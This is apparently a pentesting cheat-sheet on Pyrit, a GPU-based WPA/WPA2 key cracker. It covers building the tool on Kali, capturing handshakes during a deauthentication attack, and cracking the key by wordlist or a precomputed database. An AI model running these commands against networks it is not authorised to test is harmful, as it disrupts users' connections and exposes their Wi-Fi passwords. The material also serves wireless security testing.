# Pyrit Attack (WPA/WPA2)

A GPGPU-driven WPA/WPA2-PSK key cracker

Pyrit exploits the computational power of many-core- and GPGPU-platforms to create massive databases, pre-computing part of the WPA/WPA2-PSK authentication phase in a space-time tradeoff. It is a powerful attack against one of the world's most used security-protocols

## Setup

Pyrit is no longer installed on Kali by default. Also `apt install pyrit -y` does not work. Pyrit still uses Python2.

```bash
cd
sudo apt update -y
sudo apt install git python2-dev libssl-dev libpcap-dev -y
git clone https://github.com/JPaulMora/Pyrit.git --depth=1
sed -i "s/COMPILE_AESNI/COMPILE_AESNIX/" Pyrit/cpyrit/_cpyrit_cpu.c
cd Pyrit
python2 setup.py clean
python2 setup.py build
sudo python2 setup.py install
cd ..
pyrit -h
```

## Commands

```bash
# Monitor and save packets while doing a deauthentication attack
sudo airmon-ng start wlan0 $CHANNEL
pyrit -r wlan0mon -o $PCAP stripLive
sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT wlan0mon
```
```bash
# Crack the secret in dictionary mode
pyrit -r $PCAP -i $WORDLIST -b $BSSID attack_passthrough
```

```bash
# Crack the secret in database mode
pyrit -i <wordlist> import_passwords                                      ## import word list to crack WPA password in pyrit with database mode
pyrit -e <ESSID> create_essid                                             ## adding the ESSID of the access point to the pyrit database
pyrit batch                                                               ## creating PMKs for ESSID
pyrit -r <capture_file> -b <AP_MAC> attack_db
```

## References

* [GoLinuxCloud Install on Kali](https://www.golinuxcloud.com/install-pyrit-in-kali-linux/)
* [Pyrit GitHub](https://github.com/JPaulMora/Pyrit)
* [Null Byte](https://null-byte.wonderhowto.com/how-to/crack-wpa-wpa2-wi-fi-passwords-with-pyrit-0196782/)